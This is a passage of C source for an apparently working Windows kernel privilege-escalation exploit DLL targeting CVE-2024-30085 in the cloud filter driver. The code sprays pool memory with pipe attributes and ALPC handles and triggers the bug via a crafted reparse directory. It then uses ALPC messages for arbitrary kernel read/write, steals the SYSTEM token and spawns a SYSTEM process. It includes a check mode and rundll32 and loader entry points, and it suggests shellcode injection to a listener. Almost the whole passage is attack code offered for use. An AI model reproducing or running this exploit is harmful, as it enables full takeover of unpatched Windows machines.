                printf("[-] Hole creation failed at %d\n", i);
                free(pAttr);
                return FALSE;
            }
        }

        if (!AllocateALPCReserveHandles(g_ports, g_portCount, 1)) {
            printf("[-] Final ALPC reserve failed\n");
            free(pAttr);
            return FALSE;
        }

        /* Free remaining 'b' entries */
        for (int i = 1; i < SPRAY_COUNT; i += 2) {
            _snprintf((char*)pAttr, attrSize, "b%x", i);
            PipeWriteAttr(pAttr, (UINT)(strlen((char*)pAttr) + 1));
        }

        /* Trigger: open the reparse directory */
        printf("[*] Triggering vulnerability (open crafted reparse dir)...\n");
        WCHAR trigPath[MAX_PATH + 1];
        /* Move back */
        MoveFileW(tmpPath, targetPath);

        swprintf_s(trigPath, MAX_PATH, L"%s\\XXX", targetPath);
        hFile = CreateFileW(trigPath, GENERIC_ALL,
                            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                            NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);

        /* Cleanup sync root */
        printf("[*] Cleaning up sync root...\n");
        CleanupSyncRoot(targetPath);

        free(pAttr);
    }

    /* --- Arbitrary kernel R/W via ALPC message --- */
    printf("[*] Looking for pipe attribute in big pool...\n");

    const UINT PIPE_ATTR_TAG = 0x7441704E; /* NpAt */
    if (!GetPoolAddr((PVOID*)&ullPipeAttributeAddr, PIPE_ATTR_TAG, 0x1000)) {
        printf("[-] BigPool query failed\n");
        printf("[-] NtQuerySystemInformation(SystemBigPoolInformation) may be restricted\n");
        printf("[-] This exploit requires Build < 19041 (pre-2004) or admin\n");
        return FALSE;
    }
    printf("[+] Pipe attribute pool: 0x%llx\n", (ULONGLONG)ullPipeAttributeAddr);

    if (!GetObjAddr((PVOID*)&ullSystemEPROCaddr, 4, (HANDLE)4)) {
        printf("[-] System EPROCESS query failed\n");
        return FALSE;
    }
    printf("[+] System EPROCESS: 0x%llx\n", (ULONGLONG)ullSystemEPROCaddr);

    hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
    if (!hProc) {
        printf("[-] OpenProcess: %u\n", GetLastError());
        return FALSE;
    }

    if (!GetObjAddr((PVOID*)&ullEPROCaddr, GetCurrentProcessId(), hProc)) {
        printf("[-] Current EPROCESS query failed\n");
        CloseHandle(hProc);
        return FALSE;
    }
    printf("[+] Current EPROCESS: 0x%llx\n", (ULONGLONG)ullEPROCaddr);
    CloseHandle(hProc);

    /* Read SYSTEM token via ALPC ExtensionBuffer -> pipe attribute */
    printf("[*] Reading SYSTEM token via ALPC...\n");
    g_message->ExtensionBuffer     = (BYTE*)ullPipeAttributeAddr + 0x20;
    g_message->ExtensionBufferSize = 0x10;

    ULONG dataLength = 0x10;
    ALPC_MESSAGE_BUF *alpcMessage = (ALPC_MESSAGE_BUF*)calloc(1, sizeof(ALPC_MESSAGE_BUF));
    if (!alpcMessage) return FALSE;

    alpcMessage->PortHeader.u1.s1.DataLength  = (USHORT)dataLength;
    alpcMessage->PortHeader.u1.s1.TotalLength = (USHORT)(sizeof(MY_PORT_MESSAGE) + dataLength);
    alpcMessage->PortHeader.MessageId         = (ULONG)(ULONG_PTR)g_hResource;

    ULONG_PTR *pAlpcData = (ULONG_PTR*)((BYTE*)alpcMessage + sizeof(MY_PORT_MESSAGE));
    pAlpcData[0] = ullSystemEPROCaddr;
    pAlpcData[1] = 0x00787878;  /* "xxx\0" */

    for (UINT i = 0; i < g_portCount; i++) {
        st = pNtAlpcSendWaitReceivePort(g_ports[i], ALPC_MSGFLG_NONE,
                                        (MY_PORT_MESSAGE*)alpcMessage,
                                        NULL, NULL, NULL, NULL, NULL);
        if (st != 0) {
            printf("[-] ALPC send failed: 0x%08x\n", (unsigned)st);
            free(alpcMessage);
            return FALSE;
        }
    }

    BYTE *outputData = (BYTE*)calloc(1, 0x1000);
    if (!outputData) { free(alpcMessage); return FALSE; }

    char pipeName[] = "xxx";
    if (!PipeReadAttr(pipeName, outputData, 0x1000)) {
        printf("[-] Pipe read failed\n");
        free(outputData);
        free(alpcMessage);
        return FALSE;
    }

    ullToken = *(ULONG_PTR*)(outputData + g_tokenOffset);
    tmpEntry = g_message->Entry;

    if (!isKernAddr(ullToken)) {
        printf("[-] Token read failed (not kernel addr): 0x%llx\n", (ULONGLONG)ullToken);
        printf("[-] Token offset 0x%X may be wrong for this build\n", g_tokenOffset);
        free(outputData);
        free(alpcMessage);
        return FALSE;
    }
    printf("[+] SYSTEM token: 0x%llx\n", (ULONGLONG)ullToken);

    free(outputData);

    /* Write SYSTEM token to current process */
    printf("[*] Writing SYSTEM token to current EPROCESS...\n");

    PKALPC_BLOB blob;
    blob = ((PKALPC_BLOB)g_reserve) - 1;
    memset(blob, 0, sizeof(KALPC_BLOB) + sizeof(KALPC_RESERVE));
    blob->Ref  = 1;
    blob->Type = AlpcReserveType;
    g_reserve->Size    = 0x28;
    g_reserve->Message = g_message;

    blob = ((PKALPC_BLOB)g_message) - 1;
    memset(blob, 0, sizeof(KALPC_BLOB) + sizeof(KALPC_MESSAGE));
    blob->Ref  = 1;
    blob->Type = AlpcMessageType;
    g_message->Reserve         = g_reserve;
    g_message->ExtensionBuffer = (BYTE*)ullEPROCaddr + g_tokenOffset;
    g_message->ExtensionBufferSize = 8;

    dataLength = 8;
    memset(alpcMessage, 0, sizeof(ALPC_MESSAGE_BUF));
    alpcMessage->PortHeader.u1.s1.DataLength  = (USHORT)dataLength;
    alpcMessage->PortHeader.u1.s1.TotalLength = (USHORT)(sizeof(MY_PORT_MESSAGE) + dataLength);
    alpcMessage->PortHeader.MessageId         = (ULONG)(ULONG_PTR)g_hResource;
    pAlpcData = (ULONG_PTR*)((BYTE*)alpcMessage + sizeof(MY_PORT_MESSAGE));
    pAlpcData[0] = ullToken;

    for (UINT i = 0; i < g_portCount; i++) {
        pNtAlpcSendWaitReceivePort(g_ports[i], ALPC_MSGFLG_NONE,
                                   (MY_PORT_MESSAGE*)alpcMessage,
                                   NULL, NULL, NULL, NULL, NULL);
    }
    g_message->Entry = tmpEntry;

    free(alpcMessage);

    if (!IsSystem()) {
        printf("[-] Token swap verify FAILED\n");
        return FALSE;
    }
    printf("[+] === WE ARE NT AUTHORITY\\SYSTEM ===\n\n");

spawn:
    {
        STARTUPINFOW si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        ZeroMemory(&pi, sizeof(pi));
        si.cb = sizeof(si);
        si.lpDesktop = (LPWSTR)L"WinSta0\\Default";

        wchar_t cmd[MAX_PATH];
        lstrcpynW(cmd, g_target, MAX_PATH);

        printf("[*] Spawning: %S\n", g_target);
        if (!CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
                            CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
            printf("[-] CreateProcessW: %u\n", GetLastError());
            return FALSE;
        }

        printf("\n");
        printf("[+] ==================================\n");
        printf("[+]  SYSTEM process created!\n");
        printf("[+]  Process: %S\n", g_target);
        printf("[+]  PID:     %u\n", pi.dwProcessId);
        printf("[+] ==================================\n\n");
        printf("[*] Next: shinject %u x64 <listener>\n", pi.dwProcessId);

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }

    return TRUE;
}

/* ================================================================
 * Check mode
 * ================================================================ */
static void DoCheck(void)
{
    printf("[*] CVE-2024-30085 - Pre-flight Check\n\n");

    if (!ResolveOffsets()) {
        printf("[-] OS version detect failed\n");
        return;
    }

    if (!NtLoad()) {
        printf("[-] ntdll resolve failed\n");
        return;
    }
    printf("[+] ntdll OK\n");

    printf(IsSystem() ? "[+] Already SYSTEM\n" : "[*] Not SYSTEM (normal user)\n");

    /* Check if cldflt.sys is loaded */
    printf("[*] Checking cldflt.sys availability...\n");

    WCHAR testDir[MAX_PATH];
    GetTempPathW(MAX_PATH, testDir);
    int tlen = lstrlenW(testDir);
    if (tlen > 0 && testDir[tlen-1] == L'\\') testDir[tlen-1] = 0;
    wcscat_s(testDir, MAX_PATH, L"\\LPE30085_chk");

    CreateDirectoryW(testDir, NULL);

    IO_STATUS_BLOCK iosb = {};
    OBJECT_ATTRIBUTES objAttr = {};
    UNICODE_STRING objName = {};
    WCHAR ntPath[MAX_PATH];
    swprintf_s(ntPath, MAX_PATH, L"\\??\\%s", testDir);
    pRtlInitUnicodeString(&objName, ntPath);
    InitializeObjectAttributes(&objAttr, &objName, 0x40, 0, NULL);

    HANDLE hTest;
    NTSTATUS st = pNtCreateFile(&hTest, GENERIC_READ | GENERIC_WRITE, &objAttr, &iosb,
                                NULL, 0, FILE_SHARE_READ | FILE_SHARE_WRITE,
                                3, 0x1, NULL, 0);
    if (st == 0) {
        BYTE testData[64] = {0};
        PMY_REPARSE_DATA_BUFFER rd = (PMY_REPARSE_DATA_BUFFER)calloc(1, 64);
        if (rd) {
            rd->ReparseTag        = IO_REPARSE_TAG_CLOUD;
            rd->ReparseDataLength = 16;
            st = pNtFsControlFile(hTest, NULL, NULL, NULL, &iosb,
                                   FSCTL_SET_REPARSE_POINT, rd, 24, NULL, 0);
            if (st == 0 || st == (NTSTATUS)0xC000000DL) {
                printf("[+] cldflt.sys: LOADED (reparse point accepted/parsed)\n");
            } else {
                printf("[-] cldflt.sys: may not be loaded (0x%08x)\n", (unsigned)st);
            }
            free(rd);
        }
        CloseHandle(hTest);
    } else {
        printf("[-] Test dir open failed: 0x%08x\n", (unsigned)st);
    }
    RemoveDirectoryW(testDir);

    /* Check SystemBigPoolInformation */
    printf("[*] Checking SystemBigPoolInformation (class 66)...\n");
    ULONG retlen = 0;
    DWORD *info = (DWORD*)malloc(0x1000);
    if (info) {
        st = pNtQuerySystemInformation(66, info, 0x1000, &retlen);
        if (st == (NTSTATUS)0xC0000004L || st == 0) {
            printf("[+] BigPoolInfo: accessible (good)\n");
        } else {
            printf("[-] BigPoolInfo: NOT accessible (0x%08x)\n", (unsigned)st);
            printf("    This exploit needs Build < 19041 or admin\n");
        }
        free(info);
    }

    /* System EPROCESS */
    PVOID sysProc = NULL;
    if (GetObjAddr(&sysProc, 4, (HANDLE)4))
        printf("[+] System EPROCESS: 0x%llx\n", (ULONGLONG)(ULONG_PTR)sysProc);
    else
        printf("[-] Handle enumeration failed\n");

    printf("\n[*] Check complete\n");
}

/* ================================================================
 * Parse arguments
 * ================================================================ */
static void ParseArgs(const char *args)
{
    if (!args || !args[0]) return;
    while (*args == ' ' || *args == '\t') args++;

    if (strncmp(args, "run", 3) == 0) {
        const char *p = args + 3;
        while (*p == ' ' || *p == '\t') p++;
        if (*p && *p != '\r' && *p != '\n') {
            MultiByteToWideChar(CP_ACP, 0, p, -1, g_target, MAX_PATH);
            int len = lstrlenW(g_target);
            while (len > 0 && (g_target[len-1] == L' ' ||
                               g_target[len-1] == L'\r' ||
                               g_target[len-1] == L'\n'))
                g_target[--len] = 0;
        }
    }
}

/* ================================================================
 * DllMain
 * ================================================================ */
BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        FixStdout();

        const char *args = NULL;
        if (lpvReserved && ((const char*)lpvReserved)[0] != '\0')
            args = (const char*)lpvReserved;

        printf("[cve-2024-30085] args: %s\n\n", args ? args : "(none)");

        if (args && strncmp(args, "check", 5) == 0)
            DoCheck();
        else {
            ParseArgs(args);
            DoExploit();
        }

        printf("\n[cve-2024-30085] Done\n");
        fflush(stdout);
    }
    return TRUE;
}

/* ================================================================
 * StartW / Start - rundll32 compatibility
 * ================================================================ */
__declspec(dllexport)
void CALLBACK StartW(HWND hwnd, HINSTANCE hinst, LPWSTR cmd, int show)
{
    (void)hwnd; (void)hinst; (void)show;
    FixStdout();
    char buf[512] = {0};
    if (cmd && cmd[0])
        WideCharToMultiByte(CP_ACP, 0, cmd, -1, buf, 511, NULL, NULL);
    if (buf[0] && strncmp(buf, "check", 5) == 0) DoCheck();
    else { ParseArgs(buf[0] ? buf : NULL); DoExploit(); }
    fflush(stdout);
}

__declspec(dllexport)
void CALLBACK Start(HWND hwnd, HINSTANCE hinst, LPSTR cmd, int show)
{
    (void)hwnd; (void)hinst; (void)show;
    FixStdout();
    if (cmd && cmd[0] && strncmp(cmd, "check", 5) == 0) DoCheck();
    else { ParseArgs(cmd); DoExploit(); }
    fflush(stdout);
}

#ifdef __cplusplus
}
#endif
